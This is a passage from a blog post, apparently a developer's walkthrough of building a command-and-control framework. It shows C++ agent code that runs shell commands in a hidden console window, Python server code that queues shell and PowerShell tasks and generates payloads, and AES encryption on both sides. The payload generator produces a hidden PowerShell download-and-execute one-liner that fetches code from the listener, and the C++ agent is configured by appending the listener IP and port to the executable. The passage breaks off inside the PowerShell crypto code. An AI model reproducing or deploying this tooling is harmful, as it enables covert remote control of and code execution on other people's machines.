&amp;hPipeWrite, &amp;saAttr, <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    STARTUPINFOW si = &#123;<span class="keyword">sizeof</span>(STARTUPINFOW)&#125;;</span><br><span class="line">    si.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">    si.hStdOutput  = hPipeWrite;</span><br><span class="line">    si.hStdError   = hPipeWrite;</span><br><span class="line">    si.wShowWindow = SW_HIDE; </span><br><span class="line"></span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    BOOL fSuccess = CreateProcessW(<span class="literal">NULL</span>, (LPWSTR)cmd, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span> (! fSuccess)</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hPipeWrite);</span><br><span class="line">        CloseHandle(hPipeRead);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> bProcessEnded = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (; !bProcessEnded ;)</span><br><span class="line">    &#123;</span><br><span class="line">        bProcessEnded = WaitForSingleObject( pi.hProcess, <span class="number">50</span>) == WAIT_OBJECT_0;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (;;)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">            DWORD dwRead = <span class="number">0</span>;</span><br><span class="line">            DWORD dwAvail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!::PeekNamedPipe(hPipeRead, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;dwAvail, <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!dwAvail)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!::ReadFile(hPipeRead, buf, <span class="built_in">min</span>(<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>, dwAvail), &amp;dwRead, <span class="literal">NULL</span>) || !dwRead)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            buf[dwRead] = <span class="number">0</span>;</span><br><span class="line">            result += buf;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hPipeWrite);</span><br><span class="line">    CloseHandle(hPipeRead);</span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>I would like to point out an important option in the process created by the <code>shell</code> function which is:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">si.wShowWindow = SW_HIDE;</span><br></pre></td></tr></table></figure>

<p>This is responsible for hiding the console window, this is also added in the <code>main()</code> function of the agent to hide the console window:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ShowWindow(GetConsoleWindow(), SW_HIDE);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



<h2 id="Agent-Handler"><a href="#Agent-Handler" class="headerlink" title="Agent Handler"></a>Agent Handler</h2><p>Now that we’ve talked about the agents, let’s go back to the server and take a look at the agent handler.</p>
<p>An <code>Agent</code> object is instantiated with a name, a listener name, a remote address, a hostname, a type and an encryption key:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Agent</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, listener, remoteip, hostname, Type, key)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.name      = name</span><br><span class="line">        self.listener  = listener</span><br><span class="line">        self.remoteip  = remoteip</span><br><span class="line">        self.hostname  = hostname</span><br><span class="line">        self.Type      = Type</span><br><span class="line">        self.key       = key</span><br></pre></td></tr></table></figure>

<p>Then it defines the sleep time which is 3 seconds by default as discussed, it needs to keep track of the sleep time to be able to determine if an agent is dead or not when removing an agent, otherwise it will keep waiting for the agent to call forever:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.sleept    = <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>After that it creates the needed directories and files:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.Path      = <span class="string">"data/listeners/&#123;&#125;/agents/&#123;&#125;/"</span>.format(self.listener, self.name)</span><br><span class="line">self.tasksPath = <span class="string">"&#123;&#125;tasks"</span>.format(self.Path, self.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(self.Path) == <span class="literal">False</span>:</span><br><span class="line">    os.mkdir(self.Path)</span><br></pre></td></tr></table></figure>

<p>And finally it creates the menu for the agent, but I won’t cover the <code>Menu</code> class in this post because it doesn’t relate to the core functionality of the tool.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">self.menu = menu.Menu(self.name)</span><br><span class="line">        </span><br><span class="line">self.menu.registerCommand(<span class="string">"shell"</span>, <span class="string">"Execute a shell command."</span>, <span class="string">"&lt;command&gt;"</span>)</span><br><span class="line">self.menu.registerCommand(<span class="string">"powershell"</span>, <span class="string">"Execute a powershell command."</span>, <span class="string">"&lt;command&gt;"</span>)</span><br><span class="line">self.menu.registerCommand(<span class="string">"sleep"</span>, <span class="string">"Change agent's sleep time."</span>, <span class="string">"&lt;time (s)&gt;"</span>)</span><br><span class="line">self.menu.registerCommand(<span class="string">"clear"</span>, <span class="string">"Clear tasks."</span>, <span class="string">""</span>)</span><br><span class="line">self.menu.registerCommand(<span class="string">"quit"</span>, <span class="string">"Task agent to quit."</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">self.menu.uCommands()</span><br><span class="line"></span><br><span class="line">self.Commands = self.menu.Commands</span><br></pre></td></tr></table></figure>

<p>I won’t talk about the wrapper functions because we only care about the core functions.</p>
<p>First function is the <code>writeTask()</code> function, which is a quite simple function, it takes the task and prepends it with the <code>VALID</code> flag then it writes it to the tasks path:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeTask</span><span class="params">(self, task)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> self.Type == <span class="string">"p"</span>:</span><br><span class="line">        task = <span class="string">"VALID "</span> + task</span><br><span class="line">        task = ENCRYPT(task, self.key)</span><br><span class="line">    <span class="keyword">elif</span> self.Type == <span class="string">"w"</span>:</span><br><span class="line">        task = task</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">with</span> open(self.tasksPath, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(task)</span><br></pre></td></tr></table></figure>

<p>As you can see, it only encrypts the task in case of <code>powershell</code> agent only, that’s because there’s no encryption in the <code>c++</code> agent (more on that in the encryption part).</p>
<p>Second function I want to talk about is the <code>clearTasks()</code> function which just deletes the <code>tasks</code> file, very simple:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clearTasks</span><span class="params">(self)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.exists(self.tasksPath):</span><br><span class="line">        os.remove(self.tasksPath)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>Third function is a very important function called <code>update()</code>, this function gets called when an agent is renamed and it updates the paths. As seen earlier, the paths depend on the agent’s name, so without calling this function the agent won’t be able to download its tasks.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self)</span>:</span></span><br><span class="line">    </span><br><span class="line">    self.menu.name = self.name</span><br><span class="line">    self.Path      = <span class="string">"data/listeners/&#123;&#125;/agents/&#123;&#125;/"</span>.format(self.listener, self.name)</span><br><span class="line">    self.tasksPath = <span class="string">"&#123;&#125;tasks"</span>.format(self.Path, self.name)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> os.path.exists(self.Path) == <span class="literal">False</span>:</span><br><span class="line">        os.mkdir(self.Path)</span><br></pre></td></tr></table></figure>

<p>The remaining functions are wrappers that rely on these functions or helper functions that rely on the wrappers. One example is the <code>shell</code> function which just takes the command and writes the task:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(self, args)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len(args) == <span class="number">0</span>:</span><br><span class="line">        error(<span class="string">"Missing command."</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        command = <span class="string">" "</span>.join(args)</span><br><span class="line">        task    = <span class="string">"shell "</span> + command</span><br><span class="line">        self.writeTask(task)</span><br></pre></td></tr></table></figure>

<p>The last function I want to talk about is a helper function called <code>displayResults</code> which takes the sent results and the agent name. If the agent is a <code>powershell</code> agent it decrypts the results and checks their validity then prints them, otherwise it will just print the results:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">displayResults</span><span class="params">(name, result)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isValidAgent(name,<span class="number">0</span>) == <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result == <span class="string">""</span>:</span><br><span class="line">            success(<span class="string">"Agent &#123;&#125; completed task."</span>.format(name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            </span><br><span class="line">            key = agents[name].key</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> agents[name].Type == <span class="string">"p"</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    plaintext = DECRYPT(result, key)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            </span><br><span class="line">                <span class="keyword">if</span> plaintext[:<span class="number">5</span>] == <span class="string">"VALID"</span>:</span><br><span class="line">                    success(<span class="string">"Agent &#123;&#125; returned results:"</span>.format(name))</span><br><span class="line">                    print(plaintext[<span class="number">6</span>:])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                success(<span class="string">"Agent &#123;&#125; returned results:"</span>.format(name))</span><br><span class="line">                print(result)</span><br></pre></td></tr></table></figure>



<h2 id="Payloads-Generator"><a href="#Payloads-Generator" class="headerlink" title="Payloads Generator"></a>Payloads Generator</h2><p>Any c2 server would be able to generate payloads for active listeners, as seen earlier in the agents part, we only need to change the <code>IP</code> address, port and key in the agent template, or just the <code>IP</code> address and port in case of the <code>c++</code> agent.</p>
<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>Doing this with the <code>powershell</code> agent is simple because a <code>powershell</code> script is just a text file so we just need to replace the strings <code>REPLACE_IP</code>, <code>REPLACE_PORT</code> and <code>REPLACE_KEY</code>.</p>
<p>The <code>powershell</code> function takes a listener name, and an output name. It grabs the needed options from the listener then it replaces the needed strings in the <code>powershell</code> template and saves the new file in two places, <code>/tmp/</code> and the files path for the listener. After doing that it generates a download cradle that requests <code>/sc/</code> (the endpoint discussed in the listeners part).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">powershell</span><span class="params">(listener, outputname)</span>:</span></span><br><span class="line">    </span><br><span class="line">    outpath = <span class="string">"/tmp/&#123;&#125;"</span>.format(outputname)</span><br><span class="line">    ip      = listeners[listener].ipaddress</span><br><span class="line">    port    = listeners[listener].port</span><br><span class="line">    key     = listeners[listener].key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"./lib/templates/powershell.ps1"</span>, <span class="string">"rt"</span>) <span class="keyword">as</span> p:</span><br><span class="line">        payload = p.read()</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">'REPLACE_IP'</span>,ip)</span><br><span class="line">    payload = payload.replace(<span class="string">'REPLACE_PORT'</span>,str(port))</span><br><span class="line">    payload = payload.replace(<span class="string">'REPLACE_KEY'</span>, key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(outpath, <span class="string">"wt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"&#123;&#125;&#123;&#125;"</span>.format(listeners[listener].filePath, outputname), <span class="string">"wt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line">    oneliner = <span class="string">"powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://&#123;&#125;:&#123;&#125;/sc/&#123;&#125;\')\""</span>.format(ip, str(port), outputname)</span><br><span class="line"></span><br><span class="line">    success(<span class="string">"File saved in: &#123;&#125;"</span>.format(outpath))</span><br><span class="line">    success(<span class="string">"One liner: &#123;&#125;"</span>.format(oneliner))</span><br></pre></td></tr></table></figure>



<h3 id="Windows-Executable-C-Agent"><a href="#Windows-Executable-C-Agent" class="headerlink" title="Windows Executable (C++ Agent)"></a>Windows Executable (C++ Agent)</h3><p>It wasn’t as easy as it was with the <code>powershell</code> agent, because the <code>c++</code> agent would be a compiled PE executable.</p>
<p>It was a huge problem and I spent a lot of time trying to figure out what to do, that was when I was introduced to the idea of a stub.</p>
<p>The idea is to append whatever data that needs to be dynamically assigned to the executable, and design the program in a way that it reads itself and pulls out the appended information.</p>
<p>In the source of the agent I added a few lines of code that do the following:</p>
<ul>
<li>Open the file as a file stream.</li>
<li>Move to the end of the file.</li>
<li>Read 2 lines.</li>
<li>Save the first line in the <code>IP</code> variable.</li>
<li>Save the second line in the port variable.</li>
<li>Close the file stream.</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::ifstream <span class="title">ifs</span><span class="params">(argv[<span class="number">0</span>])</span></span>;</span><br><span class="line">	</span><br><span class="line">ifs.seekg(TEMPLATE_EOF);</span><br><span class="line">	</span><br><span class="line"><span class="built_in">std</span>::getline(ifs, ip);</span><br><span class="line"><span class="built_in">std</span>::getline(ifs, sPort);</span><br><span class="line"></span><br><span class="line">ifs.<span class="built_in">close</span>();</span><br></pre></td></tr></table></figure>

<p>To get the right <code>EOF</code> I had to compile the agent first, then update the agent source and compile again according to the size of the file.</p>
<p>For example this is the current definition of <code>TEMPLATE_EOF</code> for the <code>x64</code> agent:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEMPLATE_EOF 52736</span></span><br></pre></td></tr></table></figure>

<p>If we take a look at the size of the file we’ll find that it’s the same:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ls -la</span><br><span class="line">-rwxrwxr-x 1 ... ... 52736 ... ... ... winexe64.exe</span><br></pre></td></tr></table></figure>

<p>The <code>winexe</code> function takes a listener name, an architecture and an output name, grabs the needed options from the listener and appends them to the template corresponding to the selected architecture and saves the new file in <code>/tmp</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">winexe</span><span class="params">(listener, arch, outputname)</span>:</span></span><br><span class="line"></span><br><span class="line">    outpath = <span class="string">"/tmp/&#123;&#125;"</span>.format(outputname)</span><br><span class="line">    ip      = listeners[listener].ipaddress</span><br><span class="line">    port    = listeners[listener].port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">"x64"</span>:</span><br><span class="line">        copyfile(<span class="string">"./lib/templates/winexe/winexe64.exe"</span>, outpath)</span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">"x32"</span>:</span><br><span class="line">        copyfile(<span class="string">"./lib/templates/winexe/winexe32.exe"</span>, outpath)        </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(outpath, <span class="string">"a"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">"&#123;&#125;\n&#123;&#125;"</span>.format(ip,port))</span><br><span class="line"></span><br><span class="line">    success(<span class="string">"File saved in: &#123;&#125;"</span>.format(outpath))</span><br></pre></td></tr></table></figure>



<h2 id="Encryption"><a href="#Encryption" class="headerlink" title="Encryption"></a>Encryption</h2><p>I’m not very good at cryptography so this part was the hardest of all. At first I wanted to use <code>AES</code> and do Diffie-Hellman  key exchange between the server and the agent. However I found that <code>powershell</code> can’t deal with big integers without the <code>.NET</code> class <code>BigInteger</code>, and because I’m not sure that the class would be always available I gave up the idea and decided to hardcode the key while generating the payload because I didn’t want to risk the compatibility of the agent. I could use <code>AES</code> in <code>powershell</code> easily, however I couldn’t do the same in <code>c++</code>, so I decided to use a simple <code>xor</code> but again there were some issues, that’s why the <code>winexe</code> agent won’t be using any encryption until I figure out what to do. </p>
<p>Let’s take a look at the crypto functions in both the server and the <code>powershell</code> agent.</p>
<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>The <code>AESCipher</code> class uses the <code>AES</code> class from the <code>pycrypto</code> library, it uses <code>AES CBC 256</code>. </p>
<p>An <code>AESCipher</code> object is instantiated with a key, it expects the key to be <code>base-64</code> encoded:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key)</span>:</span></span><br><span class="line"></span><br><span class="line">        self.key = base64.b64decode(key)</span><br><span class="line">        self.bs  = AES.block_size</span><br></pre></td></tr></table></figure>

<p>There are two functions to pad and unpad the text with zeros to match the block size:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(self, s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s + (self.bs - len(s) % self.bs) * <span class="string">"\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span><span class="params">(self, s)</span>:</span></span><br><span class="line">    s = s.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    <span class="keyword">return</span> s.rstrip(<span class="string">"\x00"</span>)</span><br></pre></td></tr></table></figure>

<p>The encryption function takes plain text, pads it, creates a random <code>IV</code>, encrypts the plain text and returns the <code>IV</code> + the cipher text <code>base-64</code> encoded:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, raw)</span>:</span></span><br><span class="line">    </span><br><span class="line">    raw      = self.pad(raw)</span><br><span class="line">    iv       = Random.new().read(AES.block_size)</span><br><span class="line">    cipher   = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + cipher.encrypt(raw.encode(<span class="string">"utf-8"</span>)))</span><br></pre></td></tr></table></figure>

<p>The decryption function does the opposite:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self,enc)</span>:</span></span><br><span class="line">    </span><br><span class="line">    enc      = base64.b64decode(enc)</span><br><span class="line">    iv       = enc[:<span class="number">16</span>]</span><br><span class="line">    cipher   = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">    plain    = cipher.decrypt(enc[<span class="number">16</span>:])</span><br><span class="line">    plain    = self.unpad(plain)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure>

<p>I created two wrapper functions that rely on the <code>AESCipher</code> class to encrypt and decrypt data:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ENCRYPT</span><span class="params">(PLAIN, KEY)</span>:</span></span><br><span class="line"></span><br><span class="line">    c   = AESCipher(KEY)</span><br><span class="line">    enc = c.encrypt(PLAIN)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> enc.decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DECRYPT</span><span class="params">(ENC, KEY)</span>:</span></span><br><span class="line"></span><br><span class="line">    c   = AESCipher(KEY)</span><br><span class="line">    dec = c.decrypt(ENC)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dec</span><br></pre></td></tr></table></figure>

<p>And finally there’s the <code>generateKey</code> function which creates a random 32 bytes key and <code>base-64</code> encodes it:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateKey</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    key    = base64.b64encode(os.urandom(<span class="number">32</span>))</span><br><span class="line">    <span class="keyword">return</span> key.decode()</span><br></pre></td></tr></table></figure>



<h3 id="PowerShell-Agent-1"><a href="#PowerShell-Agent-1" class="headerlink" title="PowerShell Agent"></a>PowerShell Agent</h3><p>The <code>powershell</code> agent uses the <code>.NET</code> class <code>System.Security.Cryptography.AesManaged</code>. </p>
<p>First function is the <code>Create-AesManagedObject</code> which instantiates an <code>AesManaged</code> object using the given key and <code>IV</code>. It’s a must to use the same options we decided to use on the server side which are <code>CBC</code> mode, zeros padding and 32 bytes key length:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Create-AesManagedObject</span><span class="params">(<span class="variable">$key</span>, <span class="variable">$IV</span>)</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$aesManaged</span>           = <span class="built_in">New-Object</span> <span class="string">"System.Security.Cryptography.AesManaged"</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.Mode      = [<span class="type">System.Security.Cryptography.CipherMode</span>]::CBC</span><br><span class="line">    <span class="variable">$aesManaged</span>.Padding   = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::Zeros</span><br><span class="line">    <span class="variable">$aesManaged</span>.BlockSize = <span class="number">128</span></span><br><span class="line">    <span class="variable">$aesManaged</span>.KeySize   = <span class="number">256</span></span><br></pre></td></tr></table></figure>

<p>After that it checks if the provided key and <code>IV</code> are of the type <code>String</code> (which means that the key or the <code>IV</code> is <code>base-64</code> encoded), depending on that it decodes the data before using them, then it returns the <code>AesManaged</code> object.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$IV</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$IV</span>.getType().Name <span class="operator">-eq</span> <span class="string">"String"</span>) &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$IV</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$aesManaged</span>.IV = <span class="variable">$IV</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$key</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span 